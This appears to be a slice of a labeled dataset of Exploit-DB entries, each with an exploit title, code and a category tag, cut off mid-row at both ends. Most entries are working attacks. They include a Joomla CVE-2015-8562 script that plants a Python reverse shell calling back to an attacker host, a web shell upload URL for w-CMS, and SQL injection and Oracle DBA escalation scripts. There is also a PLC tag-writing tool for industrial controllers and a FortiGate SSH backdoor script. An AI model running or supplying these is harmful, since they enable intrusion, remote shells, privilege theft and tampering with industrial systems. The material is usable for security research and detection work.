(ELT(8112=8112,1))),0x7162787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- rVyr&listing_container=entity_items_listing68_23&page=1&search_keywords=cvjm%C3%B6nb%C3%B6m%C3%B6nm&use_search_fields=184&search_in_comments=false&search_in_all=false&search_type_and=false&search_type_match=false&search_reset=&listing_order_fields=&has_with_selected=1  # Type: time-based blind # Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)  Payload: redirect_to=report_68&path=23&reports_entities_id=23&reports_id=68' AND (SELECT 4324 FROM (SELECT(SLEEP(5)))KySi)-- Pfwf&listing_container=entity_items_listing68_23&page=1&search_keywords=cvjm%C3%B6nb%C3%B6m%C3%B6nm&use_search_fields=184&search_in_comments=false&search_in_all=false&search_type_and=false&search_type_match=false&search_reset=&listing_order_fields=&has_with_selected=1",SQL Injection,1
27603,"w-CMS 2.0.1 - Remote Code Execution Exploit Title: w-CMS 2.0.1 Remote Code Execution Vulnerability Google Dork: intext:""Powered by w-CMS"" Date: 15/08/2013 Exploit Author: ICheer_No0M - http://icheernoom.blogspot.com/ Vendor Homepage: http://w-cms.org/ Software Link: - Version: 2.0.1 Tested on: Windows 7 + PHP 5.2.6   ---> Vuln Code : /userFunctions.php        6. switch($_REQUEST['udef']) // user defined function 	     ...  11. case 'activity': procActivity(); // <-- call procActivity Function 	     ... 254. function procActivity() 255. { 256. 	$type    = $_REQUEST['type']; // <-- type 257. 	$content = $_REQUEST['content']; // <-- content 258. 	$content = preg_replace(""/\|/"",""\0xff "",$content).""\n""; 259. 	$data = explode(""\n"",@file_get_contents(""./public/$type""));  260. 	$file = @fopen(""./public/$type"", ""w""); // <-- filename = $type 261. 	if($file); 262. 	{ 263. 		fwrite($file, $content); // <-- fwrite to write $content into $filename 264.		for($ix=0;$ix<25;$ix++) 265.		{ 266.			fwrite($file,$data[$ix].""\n""); 267.		} 268.		fclose($file); 269. 	}      ---> Exploit/Proof of Concept (PoC)   http://localhost/wcms/userFunctions.php?udef=activity&type=shell.php&content=<?php system($_GET['cmd']); ?>   Find your shell on /public/shell.php",Remote Code Execution,1
24407,"Microsoft Internet Explorer 6 - Resource Detection source: https://www.securityfocus.com/bid/11026/info  Microsoft Internet Explorer is prone to a security weakness that may permit an attacker to determine the existence of resources on a vulnerable computer.  An attacker can use an IFRAME that is accessible within the same domain and change its URI to the location of a file or directory. The attacker can then determine the existence of the resource by the error message returned by Internet Explorer.  This weakness can then allow the attacker to carry out other attacks against a vulnerable computer.  This issue was tested on Microsoft Internet Explorer 5.0 and 6.0. Other versions of the browser are likely affected as well.  <iframe src=""http://www.example.com""></iframe> <script type=""text/javascript""> onload=function () { var sLocal=""C:/some_file_or_folder""; frames[0].location.href=sLocal; setTimeout( function () { try { frames[0].document; alert(sLocal+"" does not exists.\nHere could execute a script that infects the computer with some virus, trojan, etc""); } catch (oErr) { alert(sLocal+"" Exists.\nThen do nothing""); } }, 250 ); } </script>",Resource Detection,1
36719,"Basic Analysis and Security Engine (BASE) 1.4.5 - '/includes/base_state_criteria.inc.php?base_path' Remote File Inclusion source: https://www.securityfocus.com/bid/51979/info                   BASE is prone to a security-bypass vulnerability and multiple remote file-include vulnerabilities.                   An attacker can exploit these issues to gain unauthorized access, obtain potentially sensitive information, or execute arbitrary script code in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.                   BASE 1.4.5 is vulnerable; other versions may be affected.  Exploit: http://www.example.com/base/includes/base_state_criteria.inc.php?BASE_path=[EV!L]",Remote File Inclusion,1
9114,"eEye Retina WiFi Security Scanner 1.0 - '.rws Parsing' Buffer Overflow (PoC) #!/usr/bin/python # # # * Title: Retina WiFi Security Scanner 1.0 (.rws parsing) Buffer Overflow Vulnerability # # # * Summary: Retina WiFi Scanner is a tool to be used to detect IEEE 802.11 (WiFi) based devices. # * Vendor: eEye Digital Security Inc. # * Product Web Page: http://www.eeye.com/ # * Current Version: 1.0.8.68 # * Notiz: The tool is implemented as part of the eEye's Retina Network Security Scanner package. # * Tested On Microsoft Windows XP Professional SP3 (English) # # * Vulnerability Discovered By Gjoko 'LiquidWorm' Krstic # * liquidworm gmail com # * http://www.zeroscience.org # * 16.05.2009 # # * Original Advisory: http://www.zeroscience.org/codes/retinawifi_bof.txt # * eEye Advisory: http://research.eeye.com/html/advisories/published/AD20090710.html # # # * --------------------------------windbg---------------------------------- * # # (1268.dd8): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # eax=41414141 ebx=00000003 ecx=000006d8 edx=00000000 esi=0000006c edi=10264da0 # eip=1001dcce esp=0012e72c ebp=0012e754 iopl=0         nv up ei pl nz na pe nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 # *** Defaulted to export symbols for [path]\WiFiCore.dll -  # WiFiCore!LibWifi_ReportHTML+0x1b48e: # 1001dcce f644300401      test    byte ptr [eax+esi+4],1     ds:0023:414141b1=?? # 0:000> g # (1268.dd8): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # eax=00000010 ebx=41414141 ecx=00000000 edx=41414141 esi=00001000 edi=41414150 # eip=7c809eda esp=00121484 ebp=001214b0 iopl=0         nv up ei pl zr na pe nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 # *** Defaulted to export symbols for [path]\kernel32.dll -  # kernel32!IsBadReadPtr+0x39: # 7c809eda 8a02            mov     al,byte ptr [edx]          ds:0023:41414141=?? # # * -------------------------------/windbg---------------------------------- * # # # * Disclosure Timeline: # # * [16.05.2009] Vulnerability discovered. # * [16.05.2009] Initial contact with the vendor with description included + screenshot + proof #		 of concept code. # * [18.05.2009] Vendor contacted again for confirmation of the vulnerability because of no reply #		 from previous e-mail. # * [18.05.2009] Vendor replied and acknowledged the vulnerability. Patch development process in #		 progress. # * [25.05.2009] Vendor contacted for information on patch development and its release process #		 because of our advisory disclosure policy. # * [29.05.2009] Vendor contacted again for information on patch development because of no reply #		 from previous e-mail. # * [29.05.2009] Vendor answered. Bug fixes scheduled within next week. # * [08.06.2009] Vendor contacted for an accurate date of a patch release or scheduled bug fix #		 time line information. # * [08.06.2009] Vendor replied and confirmed that the vulnerability has been mitigated and passed #		 the QA. The fix will be introduced in the next release of the product. Scheduled #		 date for the release of the update is not yet known...or...it's unknown  :) . # * [12.06.2009] Vendor informs that the fix will be released along with the new scheduled release #		 of the Retina package approximately on 29th of June. # * [29.06.2009] Contacted the vendor, asked for a more accurate (fixed) date of the release. # * [29.06.2009] Vendor says that the patch is being tested by the QA team along with other program # *		 fixes. Vendor will contact me after the tests, with the results from the same. # * [06.07.2009] Sent an e-mail to the vendor stating that the advisory is planned to be published # *		 on 10th of july because of internal company reasons. # * [10.07.2009] Vendor releases patch: http://download.eeye.com/html/products/retinawireless/ # * [10.07.2009] Public advisory released. # # # # * Pozdrav Do: # # * sm, thricer, drowsy, Jayji, Leon Juranic, # * teppei, n3tpr0b3, DrunkY, apo, Aodrulez, # * kokanin, e.wiZz!, j0rgan, str0ke, Uploader, # * Jonathan Salwan, Sergio 'shadown' Alvarez, # * Malformation, dz0, d3, Greg Linares, lio, # * mio, drown, dni, Damjan, Maximiliano Soler, # * leetgeek, Preddy, Gliser, eSDee i t.d.  :)  # # # * Proof Of Concept: #   #=========================================*snip*=========================================#   header = ( 	 ""\x52\x57\x53"" 	 ""\x30\x31\x30"" 	 ""\x19\x52\x76"" 	 ""\x00"" 	 )  buffer = ""\x41"" * 1574624	#[Bytes/chars] 				#1574622 No issues 				#1574623 BoF, Access violation when reading [random] 				#1574624 BoF, Access violation when reading [414141B1] 				#...  payload = header + buffer  file = ""Abulia.rws""  filetzio=open(file,'w') filetzio.write(payload) filetzio.close()  print ""\n[+] File "" + file + "" successfully landed.\n""   #=========================================*snip*=========================================#     ################################################################################# #										# # * Disclaimer:									# #										# # * This  document and all the information it contains are provided ""as is"",	# # * for educational purposes only, without warranty of any kind, whether	# # * express or implied.								# #										# # * The  author reserves the right not to be responsible for the topicality,	# # * correctness, completeness or quality of the information provided in		# # * this document. Liability claims regarding damage caused by the use of	# # * any information provided, including any kind of information which is	# # * incomplete or incorrect, will therefore be rejected.			# #										# #################################################################################  # milw0rm.com [2009-07-10]",Buffer Overflow,1
39033,"Joomla! 1.5 < 3.4.5 - Object Injection 'x-forwarded-for' Header Remote Code Execution #!/usr/bin/env python  # Exploit Title: Joomla 1.5 - 3.4.5 Object Injection RCE X-Forwarded-For header # Date: 12/17/2015 # Exploit Author: original - Gary@ Sec-1 ltd, Modified - Andrew McNicol BreakPoint Labs (@0xcc_labs) # Vendor Homepage: https://www.joomla.org/ # Software Link: http://joomlacode.org/gf/project/joomla/frs/ # Version: Joomla 1.5 - 3.4.5 # Tested on: Ubuntu 14.04.2 LTS (Joomla! 3.2.1 Stable) # CVE : CVE-2015-8562   '''     Joomla 1.5 - 3.4.5 Object Injection RCE - CVE-2015-8562     PoC for CVE-2015-8562 to spawn a reverse shell or automate RCE      Original PoC from Gary@ Sec-1 ltd (http://www.sec-1.com):      https://www.exploit-db.com/exploits/38977/      Vulnerability Info, Exploit, Detection:     https://breakpoint-labs.com/joomla-rce-cve-2015-8562/      Exploit modified to use ""X-Forwarded-For"" header instead of ""User-Agent"" to avoid default logged to access.log      Usage - Automate Blind RCE:     python joomla-rce-2-shell.py -t http://192.168.1.139/ --cmd     $ touch /tmp/newhnewh          Usage - Spawn Reverse Shell using Pentestmonkey's Python one-liner and netcat listener on local host:     python joomla-rce-2-shell.py -t http://192.168.1.139/ -l 192.168.1.119 -p 4444     [-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://192.168.1.139/     [-] Uploading python reverse shell with LHOST:192.168.1.119 and LPORT:4444     <Response [200]>     [+] Spawning reverse shell....     <Response [200]>      Listening on [0.0.0.0] (family 0, port 4444)     $ python -c ""import pty;pty.spawn('/bin/bash')""     www-data@ubuntu:/$ id     uid=33(www-data) gid=33(www-data) groups=33(www-data)     www-data@ubuntu:/$   '''      import requests import subprocess import argparse import sys import base64   # Heavy lifting from PoC author Gary@ Sec-1 ltd (http://www.sec-1.com) def get_url(url, user_agent):       headers = {     'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', # Change default UA for Requests     'x-forwarded-for': user_agent   # X-Forwarded-For header instead of UA     }     cookies = requests.get(url,headers=headers).cookies     for _ in range(3):         response = requests.get(url, headers=headers,cookies=cookies)         return response   def php_str_noquotes(data):     ""Convert string to chr(xx).chr(xx) for use in php""     encoded = """"     for char in data:         encoded += ""chr({0})."".format(ord(char))       return encoded[:-1]    def generate_payload(php_payload):       php_payload = ""eval({0})"".format(php_str_noquotes(php_payload))       terminate = '\xf0\xfd\xfd\xfd';     exploit_template = r'''}__test|O:21:""JDatabaseDriverMysqli"":3:{s:2:""fc"";O:17:""JSimplepieFactory"":0:{}s:21:""\0\0\0disconnectHandlers"";a:1:{i:0;a:2:{i:0;O:9:""SimplePie"":5:{s:8:""sanitize"";O:20:""JDatabaseDriverMysql"":0:{}s:8:""feed_url"";'''     injected_payload = ""{};JFactory::getConfig();exit"".format(php_payload)         exploit_template += r'''s:{0}:""{1}""'''.format(str(len(injected_payload)), injected_payload)     exploit_template += r''';s:19:""cache_name_function"";s:6:""assert"";s:5:""cache"";b:1;s:11:""cache_class"";O:20:""JDatabaseDriverMysql"":0:{}}i:1;s:4:""init"";}}s:13:""\0\0\0connection"";b:1;}''' + terminate       return exploit_template   def main():     parser = argparse.ArgumentParser(prog='cve-2015-8562.py', description='Automate blind RCE for Joomla vuln CVE-2015-8652')     parser.add_argument('-t', dest='RHOST', required=True, help='Remote Target Joomla Server')     parser.add_argument('-l', dest='LHOST', help='specifiy local ip for reverse shell')     parser.add_argument('-p', dest='LPORT', help='specifiy local port for reverse shell')     parser.add_argument('--cmd', dest='cmd', action='store_true', help='drop into blind RCE')      args = parser.parse_args()      if args.cmd:         print ""[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}"".format(args.RHOST)         print ""[-] Dropping into shell-like environment to perform blind RCE""         while True:             command = raw_input('$ ')             cmd_str = ""system('{}');"".format(command)             pl = generate_payload(cmd_str)             print get_url(args.RHOST, pl)      # Spawn Reverse Shell using Netcat listener + Python shell on victim     elif args.LPORT and args.LPORT:         connection = ""'{}', {}"".format(args.LHOST, args.LPORT)          # pentestmonkey's Python reverse shell one-liner:         shell_str = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('''+connection+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'''         # Base64 encoded the Python reverse shell as some chars were messing up in the exploit         encoded_comm = base64.b64encode(shell_str)         # Stage 1 payload Str         payload = ""echo {} | base64 -d > /tmp/newhnewh.py"".format(encoded_comm)         print ""[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}"".format(args.RHOST)         print ""[-] Uploading python reverse shell with LHOST {} and {}"".format(args.LHOST, args.LPORT)         # Stage 1: Uploads the Python reverse shell to ""/tmp/newhnewh.py""         pl = generate_payload(""system('""+payload+""');"")         print get_url(args.RHOST, pl)         # Spawns Shell listener using netcat on LHOST         listener = subprocess.Popen(args=[""gnome-terminal"", ""--command=nc -lvp ""+args.LPORT])         print ""[+] Spawning reverse shell....""         # Stage 2: Executes Python reverse shell back to LHOST:LPORT         pl = generate_payload(""system('python /tmp/newhnewh.py');"")         print get_url(args.RHOST, pl)     else:         print '[!] missing arguments'         parser.print_help()   if __name__ == ""__main__"":     main()",Header Remote Code Execution,1
8279,"PHPizabi 0.848b C1 HFP1 - Privilege Escalation -------------------------------------------------------------------------------- PHPizabi v0.848b C1 HFP1 proc.inc.php remote privilege escalation (php.ini independent) by Nine:Situations:Group::bookoo -------------------------------------------------------------------------------- our site: http://retrogod.altervista.org/ software site: http://www.phpizabi.net/ --------------------------------------------------------------------------------  vulnerability: sql injection in /theme/default/proc.inc.php  <?php  	function bufferProcParse($buffer) { 		global $CONF; 		 		$tpl = new template; 		$tpl -> LoadThis($buffer); 		// HANDLE POSTED NOTEPAD DATA /////////////////////////////////////////////////////// 		if (isset($_GET[""notepad_body""])) { 			myQ(""UPDATE `[x]users` SET `notepad_body` = '"".urldecode($_GET[""notepad_body""]).""' WHERE `id`='"".me(""id"").""'""); 			me(""flush""); 		} ...  note urldecode() ...  exploitation, manual:  injection urls:  change username and password of an existing user: [sql]', username = 'bookoo', password = md5('pass') WHERE username = 'user'/* which becomes: http://host/path_to_phpizabi/?notepad_body=%2527,%20username%20=%20%2527bookoo%2527,%20password%20=%20md5(%2527pass%2527)%20WHERE%20username%20=%20%2527user%  2527/*  grant yourself admin rights: [sql]', is_moderator = 1, is_administrator = 1, is_superadministrator = 1 WHERE username = 'bookoo'/* which becomes:  http://host/path_to_phpizabi/?notepad_body=%2527,%20is_moderator%20=%201,%20is_administrator%20=%201,%20is_superadministrator%20=%201%20WHERE%20username%20=%  20%2527bookoo%2527/*  navigate:  http://host/path_to_phpizabi/?L=admin.index  boom !  now go to:  http://host/path_to_phpizabi/?L=admin.cms.edit&id={cms.file}  use this opening and closing tag style, example:  <script language=""php""> system(""ls -la""); </script>  (it is always availiable, see:http://www.php.net/manual/en/language.basic-syntax.phpmode.php) because of that preg_replace() in /modules/admin/cms/edit.php :  ... 	if (isset($_POST[""Submit""])) { 		if ($handle = fopen(""modules/cms/{$_GET[""id""]}.php"", ""w"")) { 			 			$body = 				""<?php if (!defined(\""CORE_STRAP\"")) die(); ?>\n"" 				.preg_replace('#(<\\?.*\\?>)|(<%.*%>)|<\\?php|<\\?|\\?>|<%|%>#si', NULL, stripslashes($_POST[""body""][0])) 				.""\n<!-- Edited by "".me(""username"")."" on "".date($CONF[""LOCALE_HEADER_DATE_TIME""])."" -->""; 			; 			 			fwrite($handle, $body); 			fclose($handle); ...  which is bypassed.  save changes and navigate:  http://host/path_to_phpizabi/?L=cms._cms_file_  to see the output...  now visit log page:  http://192.168.0.1/phpizabi/?L=admin.logs.logs  ... --------------------------------------------------------------------------------  # milw0rm.com [2009-03-24]",Privilege Escalation,1
3584,"Oracle 10g KUPM$MCP.MAIN - SQL Injection (2) #!/usr/bin/perl # # Remote Oracle KUPM$MCP.MAIN exploit (10g) #  - Version 2 - New ""evil cursor injection"" tip! #  - No ""create procedure"" privilege needed! #  - See: http://www.databasesecurity.com/ (Cursor Injection) # # Grant or revoke dba permission to unprivileged user #  # Tested on ""Oracle Database 10g Enterprise Edition Release 10.1.0.3.0"" #  #   REF:    http://www.red-database-security.com/ #    #   AUTHOR: Andrea ""bunker"" Purificato #           http://rawlab.mindcreations.com # #   DATE:   Copyright 2007 - Tue Mar 27 10:46:55 CEST 2007 # # Oracle InstantClient (basic + sdk) required for DBD::Oracle #  #  # bunker@fin:~$ perl kupm-mcpmainV2.pl -h localhost -s test -u bunker -p **** -r #  [-] Wait... #  [-] Revoking DBA from BUNKER... #  DBD::Oracle::db do failed: ORA-01951: ROLE 'DBA' not granted to 'BUNKER' (DBD ERROR: OCIStmtExecute) [for Statement ""REVOKE DBA FROM BUNKER""] at kupm-mcpmainV2.pl line 104. #  [-] Done! #  # bunker@fin:~$ perl kupm-mcpmainV2.pl -h localhost -s test -u bunker -p **** -g #  [-] Wait... #  [-] Creating evil cursor... #  Cursor: 2 #  [-] Go ...(don't worry about errors)! #  DBD::Oracle::st execute failed: ORA-06512: at ""SYS.KUPM$MCP"", line 874 #  ORA-06512: at line 3 (DBD ERROR: OCIStmtExecute) [for Statement "" #  BEGIN #    SYS.KUPM$MCP.MAIN(''' AND 0=dbms_sql.execute(2)--',''); #  END; #  ""] at kupm-mcpmainV2.pl line 134. #  [-] YOU GOT THE POWAH!! #  # bunker@fin:~$ perl kupm-mcpmainV2.pl -h localhost -s test -u bunker -p **** -r #  [-] Wait... #  [-] Revoking DBA from BUNKER... #  [-] Done! #  use warnings; use strict; use DBI; use Getopt::Std; use vars qw/ %opt /;  sub usage {     print <<""USAGE"";      Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]  Options:      -h     <host>     target server address      -s     <sid>      target sid name      -u     <user>     user      -p     <passwd>   password        -g|-r             (g)rant dba to user | (r)evoke dba from user     [-P     <port>     Oracle port]  USAGE     exit 0 }  my $opt_string = 'h:s:u:p:grP:'; getopts($opt_string, \%opt) or &usage; &usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} ); &usage if ( !$opt{g} and !$opt{r} ); my $user = uc $opt{u};  my $dbh = undef; if ($opt{P}) {     $dbh = DBI->connect(""dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}"", $opt{u}, $opt{p}) or die; } else {     $dbh = DBI->connect(""dbi:Oracle:host=$opt{h};sid=$opt{s}"", $opt{u}, $opt{p}) or die; }  my $sqlcmd = ""GRANT ALL PRIVILEGE, DBA TO $user""; print ""[-] Wait...\n""; $dbh->func( 1000000, 'dbms_output_enable' );   if ($opt{r}) {     print ""[-] Revoking DBA from $user...\n"";     $sqlcmd = ""REVOKE DBA FROM $user"";     $dbh->do( $sqlcmd );     print ""[-] Done!\n"";     $dbh->disconnect;     exit; }  print ""[-] Creating evil cursor...\n""; my $sth = $dbh->prepare(qq{ DECLARE MYC NUMBER; BEGIN   MYC := DBMS_SQL.OPEN_CURSOR;   DBMS_SQL.PARSE(MYC,'declare pragma autonomous_transaction; begin execute immediate ''$sqlcmd'';commit;end;',0);   DBMS_OUTPUT.PUT_LINE('Cursor: '||MYC); END; } ); $sth->execute; my $cursor = undef; while (my $line = $dbh->func( 'dbms_output_get' )) {      print ""$line\n"";     if ($line =~ /^Cursor: (\d)/) {$cursor = $1;} } $sth->finish;  print ""[-] Go ...(don't worry about errors)!\n""; $sth = $dbh->prepare(qq{ BEGIN   SYS.KUPM\$MCP.MAIN(''' AND 0=dbms_sql.execute($cursor)--',''); END; }); $sth->execute; $sth->finish; print ""[-] YOU GOT THE POWAH!!\n""; $dbh->disconnect; exit;  # milw0rm.com [2007-03-27]",SQL Injection,1
45590,"Phoenix Contact WebVisit 2985725 - Authentication Bypass # Exploit Title: Phoenix Contact WebVisit 2985725 - Authentication Bypass # Date: 2018-09-30 # Exploit Author: Deneut Tijl # Vendor Homepage: www.phoenixcontact.com # Software Link: https://www.phoenixcontact.com/online/portal/nl/?uri=pxc-oc-itemdetail:pid=2985725&library=nlnl&pcck=P-19-05-01&tab=5 # Version: WebVisit (all versions) # CVE : CVE-2016-8380, CVE-2016-8371  # Description # Script to read and write PLC tags via a Webvisit HMI page (even in case of a password protection) # Steps: # * Get Project Name: http://<ip>/ # * Get list of tags: http://<ip>/<projectname>.tcr # * Get current values of tags: http://<ip>/cgi-bin/ILRReadValues.exe # * Set new tag values: http://<ip>/cgi-bin/writeVal.exe?<tag>+<value> (urlencode!)  # CVE-2016-8380-SetPLCValues.py  #! /usr/bin/env python  import urllib2  strIP = raw_input('Please enter an IP [192.168.1.200]: ') if strIP == '': strIP = '192.168.1.200'  try:     URLResponse = urllib2.urlopen(urllib2.Request('http://' + strIP + '/')) except urllib2.HTTPError:     print('#### Critical Error with IP ' + strIP + ': no response')     raw_input('Press Enter to exit')     exit()  strProject = '' for line in URLResponse.readlines():     if 'ProjectName' in line:         strProject = line.split('VALUE=""')[1].split('""')[0]  if strProject == '':     print('#### Error, no \'ProjectName\' found on the main page')     raw_input('Press Enter to exit')     exit()  print('---- Found project \'' + strProject + '\', retrieving list of tags')  try:     TagResponse = urllib2.urlopen(urllib2.Request('http://' + strIP + '/' + strProject + '.tcr')) except urllib2.HTTPError:     print('#### Critical Error with IP ' + strIP + ': /' + strProject + '.tcr not found')     raw_input('Press Enter to exit')     exit()  arrTagList = [] for line in TagResponse.readlines():     if line.startswith('#!-- N ='):         intNumberOfTags = int(line.split('=')[1])         print('---- There should be ' + str(intNumberOfTags) + ' tags:')     if not line.startswith('#'):         if not line.split(';')[0].strip() == '':             arrTagList.append(line.split(';')[0].strip())             print('-- '+line.split(';')[0].strip())   raw_input('Press Enter to query them all') import os, urllib os.system('cls' if os.name == 'nt' else 'clear') strPost = '<body>' strPost += '<item_list_size>' + str(len(arrTagList)) + '</item_list_size>' strPost += '<item_list>' for item in arrTagList:     strPost += '<i><n>' + item + '</n></i>' strPost += '</item_list></body>' DataResponse = urllib2.urlopen(urllib2.Request('http://' + strIP + '/cgi-bin/ILRReadValues.exe', strPost)).read()  arrData = [] for item in DataResponse.split('<i>'):     if '<n>' in item:         name = item.split('<n>')[1].split('</n>')[0]         value = item.split('<v>')[1].split('</v>')[0]         arrData.append((name,value)) print('----- Full list of tags and their values:') i = 0 for item in arrData:     i += 1     print(str(i) + ': Tag ' + item[0] + ' has value: ' + item[1])  ans1 = raw_input('Want to change a tag? Enter a number or press Enter to quit: ') if ans1 == '':     exit() strTag = arrData[int(ans1) - 1][0] strVal = arrData[int(ans1) - 1][1] ans2 = raw_input('Setting value for ' + strTag + ' [' + strVal + ']: ') if ans2 == '': ans2 = strVal urllib2.urlopen(urllib2.Request('http://' + strIP + '/cgi-bin/writeVal.exe?' + urllib.quote_plus(strTag) + '+' + str(ans2)))",Authentication Bypass,1
18181,"FreeBSD - 'ftpd / ProFTPd' Remote Command Execution /* KCOPE2011 - x86/amd64 bsd ftpd remote root exploit  *  * KINGCOPE CONFIDENTIAL - SOURCE MATERIALS  *  * This is unpublished proprietary source code of KINGCOPE Security.  *  * (C) COPYRIGHT KINGCOPE Security, 2011  * All Rights Reserved  *  *****************************************************************************  * bug found by Kingcope  * thanks to noone except alex whose damn down  *  * tested against:  FreeBSD-8.2,8.1,7.2,7.1 i386;  *					FreeBSD-6.3 i386  *					FreeBSD-5.5,5.2 i386  * 					FreeBSD-8.2 amd64  * 					FreeBSD-7.3, 7.0 amd64  *					FreeBSD-6.4, 6.2 amd64  *  */  I m better than TESO 7350 see attached. I aint mad at cha and dont forget that the scene is fucked. and that the public scene is fucked too, kind of. youse a down ass bitch and I aint mad at cha. thanks lsd you are the only one NORMAL. hear the track before you see the code: http://www.youtube.com/watch?v=krxu9_dRUwQ BTW my box (isowarez.de) got hacked so expect me in a zine :>  /Signed ""the awesome"" Kingcope  Code: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/18181.tar (7350roaringbeastv3.tar)",Remote Command Execution,1
13749,"idevspot Text ads 2.08 - SQL Injection # Title:idevspot Text ads 2.08 sqli vulnerability # Author: Sid3^effects # Published: 2010-06-06 # price:$147 # email:shell_c99@yahoo.com # vendor: idevspot # url : http://www.idevspot.com/TextAds2.php # google dork : Powered by TextAds 2.08  ############################################################################         ooooo  .oooooo.  oooooo   oooooo     oooo          `888' d8P'  `Y8b  `888.    `888.     .8'           888 888           `888.   .8888.   .8'           888 888            `888  .8'`888. .8'           888 888             `888.8'  `888.8'            888 `88b    ooo      `888'    `888'          o888o `Y8bood8P'       `8'      `8'                                                --------------------------------------------------------------------------------------  #####################Sid3^effects aKa HaRi##################################  #Greetz to all Andhra Hackers and ICW Memebers[Indian Cyber Warriors]  #Thanks:*L0rd ÇrusAdêr*,d4rk-blu™®,R45C4L,CR4C|< 008,M4n0j,MaYuR  #ShouTZ:kedar,dec0d3r,41.w4r10r #spl shoutz:LiquidWorm,gunslinger_ :D       #Catch us at www.andhrahackers.com or www.teamicw.in  ############################################################################  Description : Increase your website revenue by selling text advertisement spots on your website. TextAds is a fully automated, impression based text advertisement system. It includes client and administrative control panels and supports Paypal (client) billing. Our easy installation will have most users up and running quickly. Customization is also quite easy, even for the non-programmer. Many additional features are yours as well with TextAds, please come check them out at our website  ############################################################################  Xploit : The idevspot TextAds V2.08 suffers from sqli Demo : http://server/textads_2/index.php?page=[sqli]           ############################################################################  #spl thks: exploit-db.com #Sid3^effects",SQL Injection,1
45572,"Microsoft Edge Chakra JIT - Type Confusion /* The switch statement only handles Js::TypeIds_Array but not Js::TypeIds_NativeIntArray and Js::TypeIds_NativeFloatArray. So for example, a native float array can be considered as of type ObjectType::Object under certain circumstances where ""objValueType.IsLikelyArrayOrObjectWithArray()"" is not fulfilled. As it doesn't install any array type conversion check for a definite object, handling a native array as a definite object can lead to type confusion.  void GlobOpt::UpdateObjPtrValueType(IR::Opnd * opnd, IR::Instr * instr) {     ...     if (newValueType == ValueType::Uninitialized)     {         switch (typeId)         {         default:             if (typeId > Js::TypeIds_LastStaticType)             {                 Assert(typeId != Js::TypeIds_Proxy);                 if (objValueType.IsLikelyArrayOrObjectWithArray())                 {                     // If we have likely object with array before, we can't make it definite object with array                     // since we have only proved that it is an object.                     // Keep the likely array or object with array.                 }                 else                 {                     newValueType = ValueType::GetObject(ObjectType::Object);                 }             }             break;         case Js::TypeIds_Array:             // Because array can change type id, we can only make it definite if we are doing array check hoist             // so that implicit call will be installed between the array checks.             if (!DoArrayCheckHoist() ||                 (currentBlock->loop                 ? !this->ImplicitCallFlagsAllowOpts(currentBlock->loop)                 : !this->ImplicitCallFlagsAllowOpts(this->func)))             {                 break;             }             if (objValueType.IsLikelyArrayOrObjectWithArray())             {                 // If we have likely no missing values before, keep the likely, because, we haven't proven that                 // the array really has no missing values                 if (!objValueType.HasNoMissingValues())                 {                     newValueType = ValueType::GetObject(ObjectType::Array).SetArrayTypeId(typeId);                 }             }             else             {                 newValueType = ValueType::GetObject(ObjectType::Array).SetArrayTypeId(typeId);             }             break;         }     }     ... }  PoC: */  function opt(arr, arr2) {     arr[0] = 1.1;      arr2.method(arr2[0] = {});      arr[0] = 2.3023e-320; }  Object.prototype.method = () => {};  let arr = [1.1, 2.2]; for (let i = 0; i < 100; i++) {     opt(arr, 1);  // Feeding an integer to make the value type LikelyCanBeTaggedValue_Int_PrimitiveOrObject     opt(arr, arr.concat()); }  setTimeout(() => {     opt(arr, arr);     alert(arr); }, 100);  // Waiting for the JIT server to finish its job.",Type Confusion,1
43386,"Fortinet FortiGate 4.x < 5.0.7 - SSH Backdoor Access #!/usr/bin/env python  # SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7 # Usage: ./fgt_ssh_backdoor.py <target-ip>  import socket import select import sys import paramiko from paramiko.py3compat import u import base64 import hashlib import termios import tty  def custom_handler(title, instructions, prompt_list):     n = prompt_list[0][0]     m = hashlib.sha1()     m.update('\x00' * 12)     m.update(n + 'FGTAbc11*xy+Qqz27')     m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')     h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())     return [h]   def main():     if len(sys.argv) < 2:         print 'Usage: ' + sys.argv[0] + ' <target-ip>'         exit(-1)      client = paramiko.SSHClient()     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())      try:         client.connect(sys.argv[1], username='', allow_agent=False, look_for_keys=False)     except paramiko.ssh_exception.SSHException:         pass      trans = client.get_transport()     try:         trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)     except paramiko.ssh_exception.AuthenticationException:         pass      trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)     chan = client.invoke_shell()      oldtty = termios.tcgetattr(sys.stdin)     try:         tty.setraw(sys.stdin.fileno())         tty.setcbreak(sys.stdin.fileno())         chan.settimeout(0.0)          while True:             r, w, e = select.select([chan, sys.stdin], [], [])             if chan in r:                 try:                     x = u(chan.recv(1024))                     if len(x) == 0:                         sys.stdout.write('\r\n*** EOF\r\n')                         break                     sys.stdout.write(x)                     